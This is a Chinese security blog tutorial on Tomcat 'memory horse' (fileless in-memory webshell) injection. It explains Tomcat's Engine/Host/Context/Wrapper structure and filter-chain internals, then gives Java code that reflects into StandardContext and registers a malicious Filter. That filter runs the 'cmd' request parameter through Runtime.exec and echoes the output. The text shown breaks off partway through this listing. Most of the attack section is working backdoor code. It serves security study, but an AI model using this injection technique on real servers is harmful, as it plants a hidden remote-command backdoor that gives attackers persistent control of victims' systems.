<!DOCTYPE html>
<html>

	<head>
		
<title>Java安全-Tomcat内存马学习-信息安全博客</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" type="image/x-icon" href="/image/favicon1.ico">


<meta name="keywords" content="Tomcat,内存马,">
<meta name="description" content="">


<script src="/js/jquery.min.js"></script>


	<meta name="generator" content="Hexo 5.4.0"></head>

	<body>
		
<link rel="stylesheet" href="/css/page.css">


<link rel="stylesheet" href="/css/page_cente.css">


<link rel="stylesheet" href="/css/atom-one-dark.css">


<link rel="stylesheet" href="/css/header.css">

	<div class="header">
		<div class="header-top">
			<div class="h-left">
				<a href="/">
					<img src="/image/logo.png" alt="Quiet">
				</a>
			</div>
			<div class="h-right">
				<ul>
					
						
								<li>
									<a href="/">
										主页
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/archives">
										文章
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/categories">
										分类
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/tags">
										标签
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/links">
										友情链接
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/about">
										关于
									</a>
									<span class="dot"></span>
								</li>
								
									
				</ul>
			</div>
			<div class="h-right-close">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
					<path fill="none" d="M0 0h24v24H0z" />
					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
				</svg>
			</div>
		</div>
	</div>
	<div class="sidebar">
    <div class="topo">
        <h2>TRRQ</h2>
    </div>
    <ul>
        
        <li>
            <a href="/">主页</a>
        </li>
        
        <li>
            <a href="/archives">文章</a>
        </li>
        
        <li>
            <a href="/categories">分类</a>
        </li>
        
        <li>
            <a href="/tags">标签</a>
        </li>
        
        <li>
            <a href="/links">友情链接</a>
        </li>
        
        <li>
            <a href="/about">关于</a>
        </li>
        
    </ul>
    <div class="my_foot">
        
        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
        </a>
        
    </div>
</div>
<div class='shelter'
    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'>
</div>
<style>
    .sidebar {
        width: 0;
        height: 100%;
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        background: #fff;
        z-index: 999;
        text-align: center;
        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
    }

    .topo {
        width: 100%;
        height: 200px;
        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
        background-size: 100% 100%;
        position: relative;
        display: flex;
        align-items: flex-end
    }

    .topo h2 {
        color: #fff;
        z-index: 1;
        position: relative;
        margin: 0 0 10px 10px;
        font-size: 1.2em;
        box-sizing: border-box
    }

    .topo:before {
        content: '';
        background-image: url(/image/pattern.png);
        background-repeat: repeat;
        height: 100%;
        left: 0;
        position: absolute;
        top: 0;
        width: 100%;
        z-index: 1
    }

    .sidebar ul {
        width: 100%;
        margin-top: 50px
    }

    .sidebar ul li {
        height: 50px;
        list-style: none;
        font-size: 1.2em;
        text-align: right;
        margin-right: 10px
    }

    .sidebar ul li a {
        display: grid;
        color: #5d606a;
        text-overflow: ellipsis;
        width: 100%;
        text-decoration: none
    }

    .my_foot {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        position: absolute;
        bottom: 0
    }

    .my_foot a {
        text-decoration: none;
        margin-right: 10px;
        display: inline-block
    }

    .my_foot a img {
        width: 30px;
        height: 30px
    }
</style>

<script>
    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
</script>
		<script>
			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
		</script>
<div class="header-bg bg-content-img">
    <div class="bg-content">
        <ul class="tag">
            
            
            <li><a href="/tags/Tomcat">Tomcat</a></li>
            
            <li><a href="/tags/内存马">内存马</a></li>
            
            
        </ul>
        <h1>Java安全-Tomcat内存马学习</h1>
        <div class="article-info">
            <div class="article-author">
                
                <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
                    xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
                    <path
                        d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
                        p-id="2902" fill="#ffffff"></path>
                </svg>
                
                <span> <a href="">TRRQ</a></span>
                <p>2022-04-10 19:19:53</p>
            </div>
        </div>
    </div>
</div>
<div class="article-content">
    <div id="article" class="content">
        <h1 id="Java安全-Tomcat内存马学习"><a href="#Java安全-Tomcat内存马学习" class="headerlink" title="Java安全-Tomcat内存马学习"></a>Java安全-Tomcat内存马学习</h1><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，它早期的名称为catalina，后来由Apache、Sun 和其他一些公司及个人共同开发而成，并更名为Tomcat。Tomcat 是一个小型的轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选，因为Tomcat 技术先进、性能稳定，成为目前比较流行的Web 应用服务器。Tomcat是应用（java）服务器，它只是一个servlet容器，是Apache的扩展，但它是独立运行的。</p>
</br>

<p>从宏观上来看，Tomcat其实是Web服务器和Servlet容器的结合体。 </p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">Web服务器：通俗来讲就是将某台主机的资源文件映射成<span class="hljs-built_in">URL</span>供给外界访问。（比如访问某台电脑上的图片文件）<br><br>Servlet容器：顾名思义就是存放Servlet对象的东西，Servlet主要作用是处理<span class="hljs-built_in">URL</span>请求。（接受请求、处理请求、响应请求）<br></code></pre></td></tr></table></figure>

</br>

<p>Tomcat由四大容器组成，分别是Engine、Host、Context、Wrapper。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。<br><br>Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml。<br><br>Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。<br><br><span class="hljs-keyword">Wrapper</span>（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。<span class="hljs-keyword">Wrapper</span> 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。 <br></code></pre></td></tr></table></figure>

<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409212257.png"></p>
<p>看一个Tomcat的基本结构：</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409212322.png"></p>
<p>Webapps 对应的就是 Host 组件，ROOT 和 example 对应的就是 Context 组件（Web应用），每个Context内包含Wrapper，Wrapper 负责管理容器内的 Servlet：</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409212509.png"></p>
</br>

<p>根据Tomcat文档可知：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">Engine，实现类为 org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardEngine</span><br>Host，实现类为 org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardHost</span><br>Context，实现类为 org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardContext</span><br>Wrapper，实现类为 org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span>.StandardWrapper<br></code></pre></td></tr></table></figure>

<p>值得一提的是，在 org.apache.catalina.core.StandardContext#startInternal()中表明了Tomcat启动加载的顺序：Listener -&gt; Filter -&gt; Servlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title">startInternal</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LifecycleException </span>&#123;<br>......<br>            <span class="hljs-keyword">if</span>(ok &amp;&amp; !<span class="hljs-keyword">this</span>.listenerStart()) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardContext.listenerFail&quot;</span>));<br>                ok = <span class="hljs-keyword">false</span>;<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span>(ok) &#123;<br>                <span class="hljs-keyword">this</span>.checkConstraintsForUncoveredMethods(<span class="hljs-keyword">this</span>.findConstraints());<br>            &#125;<br> <br>            <span class="hljs-keyword">try</span> &#123;<br>                Manager manager = <span class="hljs-keyword">this</span>.getManager();<br>                <span class="hljs-keyword">if</span>(manager <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>                    ((Lifecycle)manager).start();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var18) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardContext.managerFail&quot;</span>), var18);<br>                ok = <span class="hljs-keyword">false</span>;<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span>(ok &amp;&amp; !<span class="hljs-keyword">this</span>.filterStart()) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardContext.filterFail&quot;</span>));<br>                ok = <span class="hljs-keyword">false</span>;<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span>(ok &amp;&amp; !<span class="hljs-keyword">this</span>.loadOnStartup(<span class="hljs-keyword">this</span>.findChildren())) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardContext.servletFail&quot;</span>));<br>                ok = <span class="hljs-keyword">false</span>;<br>            &#125;<br> <br>            <span class="hljs-keyword">super</span>.threadStart();<br>......<br></code></pre></td></tr></table></figure>

<p>Wrapper代表（负责管理）一个Servlet，而Context中包含了一个或多个Warpper（即Servlet）。</p>
</br>

<h2 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h2><p>首先我们需要配置tomcat，并且创建webapp和web.xml</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409095607.png"></p>
<p>创建Filter测试类，用于我们调试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sec.filter;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123; &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException, IOException </span>&#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        filterChain.doFilter(servletRequest,servletResponse);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123; &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409095741.png"></p>
<p>web.xml添加上Filter的配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.sec.filter.FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>后面这一步很重要，将tomcat下的lib文件夹jar包导入</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409100105.png"></p>
</br>

<p>当我们运行tomcat后，会直接弹出计算器。在实战环境下，你不可能写一个Filter对象然后又放到对方的代码中，这样子不就早getshell了</p>
<p>对于内存马，我们是需要找到一个注入点，动态的在内存中创建一个Filter对象，这样子的话就是一个真正的内存马</p>
</br>

<h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>当我们启动web的时候，会产生一个ServletContext为接口的对象，这个对象全局唯一，而且工程内部的所有servlet都共享这个对象。所以叫全局应用程序共享对象</p>
<p>在web应用中，获取的ServletContext实际上是ApplicationContextFacade的对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，所以说我们在tomcat中拿到StandardContext则是去获取ApplicationContextFacade这个对象</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409103851.png"></p>
<p>使用request.getServletContext()函数会得ServletContext，它本质是ApplicationContextFacade类的对象，任何人都可以使用request.getServletContext()获取servletcontext</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409104847.png"></p>
<p>这里可以看到ApplicationContextFacade的context属性是一个ApplicationContext</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409110307.png"></p>
</br>

<p><code>ServletContext</code>其实是一个接口，这个接口的实现是<code>ApplicationContext</code>类。StandardContext对象其实也就是ApplicationContext对象</p>
<p>ApplicationContext中有一个私有变量叫做StandardContext，<code>StandardContext类的对象可以动态创建servlet和servlet的映射，也可以通过修改参数来添加filter到filterchain。</code></p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409105137.png"></p>
<p>如果能通过反射调用StandardContext对象中的函数，那么就能制造filter与servlet类型的内存马</p>
</br>

<p>我们可以下断点到internalDoFilter类上，为什么我们要断在这呢，因为它是一个调用Filter对象的一个调度类，就是专门用来调用所有实现的Filter对象的doFilter方法，而其中的internalDoFilter就是去调用我们Filter对象中实现的doFilter方法的一个手段</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409111509.png"></p>
<p>我们可以往上看下谁调用到了internalDoFilter方法</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409111739.png"></p>
<p>我们往上看可以看到有个工厂类调用到了createFilterChain</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409112013.png"></p>
<p>跟进createFilterChain方法，获取到StandardContext对象</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409170911.png"></p>
<p>通过这个对象的findFilterMaps方法来获得所有需要调用的Filter对象</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409171023.png"></p>
<p>接着又会开始遍历这个FilterMap数组中的每个FilterMap对象（每个FilterMap都包含了每个Filter的相关信息），每次拿到一个FilterMap对象就是通过matchDispatcher和matchFiltersURL来比较访问的路由和Filter对象的路由是否有包含关系</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/image-20220409171256937.png"></p>
<p>最后会每个Filter对象相关信息都存储到了FilterConfig对象中，然后再把FilterConfig对象放到了filterChain这个属性中，而这里的filterChain属性就是外面的这个ApplicationFilterChain对象，到这里要调用的每个Filter对象都拼装好了，全部都放入了ApplicationFilterChain对象，ApplicationFilterChain这个对象我们上面也讲过，是一个调度类，专门调用每个Filter的doFilter方法。</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409171339.png"></p>
</br>

<h3 id="FilterConfig"><a href="#FilterConfig" class="headerlink" title="FilterConfig"></a>FilterConfig</h3><p>我们知道ApplicationFilterChain这个对象的由来和它的作用，先是经过一系列的处理最后拿到了ApplicationFilterChain这个对象，这个对象中包含了每个Filter的相关配置信息，最后则开始调用其中的doFilter方法</p>
<p>继续来看createFilterChain方法帮我们做的事情，它实现的Filter的添加，createFilterChain这个方法返回的filterChain最终会被进行调用，那么我们如果能实现在filterChain进行插入的话，那是不是我们就成功的实现了添加自定义的Filter对象</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409185330.png"></p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409185402.png"></p>
<p>该对象有三个重要的属性，一个是ServletContext，一个是filter，一个是filterDef</p>
</br>

<p>我们前面通过matchDispatcher()、matchFilterURL()方法进行匹配，匹配成功后，还需判断StandardContext.filterConfigs中，是否存在对应filter的实例。当实例不为空时通过filterchain.addfilter(Filterconfig)函数来将FilterConfig对应的filter添加到filterchain中。此时filter内存马已经添加完成</p>
<p>也就是意味着standardcontext中的filtermap中有我们指定的filter，且filterconfig中有我们指定的filter，那么这个filter就会被正常加载到内存。</p>
</br>

<p>接下来的任务就是修改FilterMap与FilterConfig的值。</p>
<p><code>filterMaps</code>是StandardContext对象中的数据我们可控。<code>filterconfig</code>是StandardContext中的数据我们可控，<code>filterconfig</code>中我们需要添加filterdef它也是我们可控的，<code>StandardContext</code>是我们可以操控的。综上filter动态添加过程是我们可操控的。</p>
</br>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = <span class="hljs-keyword">new</span> HashMap();<br><br><span class="hljs-keyword">private</span> HashMap&lt;String, FilterDef&gt; filterDefs = <span class="hljs-keyword">new</span> HashMap();<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StandardContext.ContextFilterMaps filterMaps = <span class="hljs-keyword">new</span> StandardContext.ContextFilterMaps();<br></code></pre></td></tr></table></figure>

<p>成员变量：</p>
<ul>
<li>filterConfigs成员变量是一个HashMap对象，里面存储了filter名称与对应的ApplicationFilterConfig对象的键值对，在ApplicationFilterConfig对象中则存储了Filter实例以及该实例在web.xml中的注册信息。filter名=对应的filterconfig</li>
<li>filterDefs<br>成员变量成员变量是一个HashMap对象，存储了filter名称与相应FilterDef的对象的键值对，而FilterDef对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据。filter名=对应的filterdef</li>
<li>filterMaps中的FilterMap则记录了不同filter与UrlPattern的映射关系。filter名=绑定的url</li>
</ul>
</br>

<p>思路：</p>
<p>1、创建恶意的Filter</p>
<p>2、再获取filterConfigs</p>
<p>2、接着实现自定义想要注入的filter对象</p>
<p>4、然后为自定义对象的filter创建一个FilterDef</p>
<p>4、最后把 ServletContext对象 filter对象 FilterDef全部都设置到filterConfigs即可完成内存马的实现</p>
</br>

<p>首先我们最先使用request.getSession().getServletContext()获取到的是ApplicationContextFacade对象，ApplicationContextFacade下的context字段</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409200704.png"></p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220409200738.png"></p>
<p>反射实现代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这里是反射获取ApplicationContextFacade</span><br>ServletContext servletContext = request.getSession().getServletContext();<br><br><span class="hljs-comment">//获取context也就是ApplicationContext</span><br>Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appctx.setAccessible(<span class="hljs-keyword">true</span>); <span class="hljs-comment">//忽略权限控制检查，获取很高的代码执行权限</span><br><br><span class="hljs-comment">//返回指定对象obj上此 Field 表示的字段的值也就是返回指定对象servletContext上此context表示的字段的值</span><br>ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><span class="hljs-comment">//获取到ApplicationContext下的context字段也就是StandardContext</span><br>Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//返回指定对象servletContext上此context表示的字段的值，也就是StandardContext对象</span><br>StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br></code></pre></td></tr></table></figure>

</br>

<p>也就是意味着standardcontext中的filtermap中有我们指定的filter，且filterconfig中有我们指定的filter，那么这个filter就会被正常加载到内存。</p>
<p>接下来的任务就是修改FilterMap与FilterConfig的值。</p>
</br>

<h3 id="构造Filter内存马"><a href="#构造Filter内存马" class="headerlink" title="构造Filter内存马"></a>构造Filter内存马</h3><p>构造按照着 <code>ApplicationFilterFactory#createFilterChain</code> 方法里的代码逻辑进行构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sec.servlet;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-meta">@WebServlet(&quot;/demoServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demoServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><br>        Field Configs = <span class="hljs-keyword">null</span>;<br>        Map filterConfigs;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//这里是反射获取ApplicationContextFacade</span><br>            ServletContext servletContext = request.getSession().getServletContext();<br>            <span class="hljs-comment">//获取context也就是ApplicationContext</span><br>            Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appctx.setAccessible(<span class="hljs-keyword">true</span>); <span class="hljs-comment">//忽略权限控制检查，获取很高的代码执行权限</span><br>            <span class="hljs-comment">//返回指定对象obj上此 Field 表示的字段的值也就是返回指定对象servletContext上此context表示的字段的值</span><br>            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br>            <span class="hljs-comment">//获取到ApplicationContext下的context字段也就是StandardContext</span><br>            Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>            <span class="hljs-comment">//返回指定对象servletContext上此context表示的字段的值，也就是StandardContext对象</span><br>            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br><br>            <span class="hljs-comment">//获取filterConfigs</span><br>            String FilterName = <span class="hljs-string">&quot;cmd_Filter&quot;</span>;<br>            Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>            <span class="hljs-comment">//返回standardContext对象的filterConfigs</span><br>            filterConfigs = (Map) Configs.get(standardContext);<br><br>            <span class="hljs-keyword">if</span> (filterConfigs.get(FilterName) == <span class="hljs-keyword">null</span>) &#123;<br>                Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>                    &#125;<br><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>                        HttpServletRequest req = (HttpServletRequest) servletRequest;<br>                        <span class="hljs-comment">//获取参数，执行并且回显</span><br>                        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>                            InputStream in = Runtime.getRuntime().exec(req.getParameter(<span 